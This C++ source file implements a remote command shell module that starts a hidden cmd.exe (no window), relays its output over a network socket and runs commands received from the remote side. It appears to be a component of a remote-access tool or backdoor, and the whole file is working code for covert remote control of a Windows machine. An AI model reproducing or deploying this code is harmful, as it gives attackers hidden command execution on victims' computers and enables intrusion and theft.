#include "RemoteShell.h"
#include "NetworkHelper.h"

/* Remote Shell definition */
CMD* RemoteShell::shell = NULL;
bool RemoteShell::cmdOpen = false;
HANDLE RemoteShell::_handle_shell_thread = NULL;

void RemoteShell::HandleHook(SOCKET s, const std::string &hook)
{
	if (hook == CMD_START_SHELL) {
		//_handle_shell_thread = (HANDLE)_beginthreadex(NULL, 0, RemoteShell::HandleShell, (void*)&s, NULL, NULL);
		std::string read;
		shell = new CMD(Settings::cmd_path);
		cmdOpen = true;
		while (cmdOpen) {
			read = shell->readCMD();
			NetworkHelper::SendString(s, read);
			read = "";
			if (NetworkHelper::RecvStringNonBlocking(s, read)) {
				if (read == CMD_STOP_SHELL) {
					cmdOpen = false;
				}
				shell->writeCMD(read);
			}
			Sleep(10);
		}
		delete shell;
		return;
	}
}

/* CMD definition */

HANDLE CMD::g_hChildProcess = NULL;
HANDLE CMD::g_hChildThread = NULL;

CMD::CMD(const std::string& cmd)
{
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		if (SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
			if (CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
				SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	createChildProcess(cmd);
}

CMD::~CMD()
{
	TerminateProcess(g_hChildProcess, 0);
}

std::string CMD::readCMD()	//read string from stdOut of cmd.exe	//IMPLEMENT AS THREAD
{
	if (RemoteShell::cmdOpen)
	{
		DWORD bytesAvailable = 0;
		DWORD bytesRead = 0;
		int intBytesAvailable = 0;
		char buffer[128] = "";
		std::string output = "";

		PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL);
		if (bytesAvailable <= 0)
			return "";
		/*
		if (bytesAvailable >= 2048)
			bytesAvailable = 2048;
			*/
		intBytesAvailable = bytesAvailable;
		while (intBytesAvailable > 0)		//while there is something to read, read it into buffer and append buffer to string
		{
			ReadFile(g_hChildStd_OUT_Rd, buffer, 127, &bytesRead, NULL);
			buffer[127] = '\0';	//NULL terminator of string
			output += buffer;
			intBytesAvailable -= bytesRead;
			if (intBytesAvailable <= 0)
				intBytesAvailable = 0;
			ZeroMemory(buffer, 128);					//clears buffer (else memory leak)
		}
		return output;
	}
	else
		return "";
}

void CMD::writeCMD(std::string &command)		//write a string to stdIn of cmd.exe
{
	if (RemoteShell::cmdOpen)
	{
		DWORD dwWritten = 0;    // Support low version Windows
		command += '\n';	//append '\n' to simulate "ENTER"
		WriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(), &dwWritten, NULL);
	}
}

void CMD::createChildProcess(const std::string &path)	//creates child process ||copied from https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx ||
{
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 
	bSuccess = CreateProcessA(path.c_str(),
		NULL,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		CREATE_NO_WINDOW,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

					   // If an error occurs, exit the application. 
	if (!bSuccess)
		return;
	else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}
	g_hChildProcess = piProcInfo.hProcess;
	g_hChildThread = piProcInfo.hThread;
}